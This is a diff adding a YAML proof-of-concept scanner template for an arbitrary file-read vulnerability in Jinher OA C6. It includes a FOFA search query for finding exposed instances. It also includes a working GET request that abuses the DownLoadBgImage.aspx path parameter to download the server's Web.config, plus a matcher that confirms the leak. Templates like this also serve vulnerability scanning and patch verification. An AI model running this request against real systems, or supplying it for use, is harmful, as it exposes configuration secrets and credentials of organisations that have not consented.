@@ -1,0 +1,16 @@
+id: poc-yaml-jinher-downLoadbgimage-fileread
+info:
+  name: 金和OA C6 DownLoadBgImage任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 金和OA C6
+  fofa: body="JHSoft.Web.AddMenu" || app="金和网络-金和OA"
+requests:
+- method: GET
+  path: /C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/?path=/C6/Web.config
+  expression: "status_code == 200 && \ncontains(body,\"<?xml version=\") &&\ncontains(body,\"\
+    <configSections>\") &&\ncontains(body,\"</section>\") &&\ncontains(body,\"</webServices>\"\
+    ) &&\ncontains(body,\"</configuration>\")\n"
+variables: {}
+transport: http
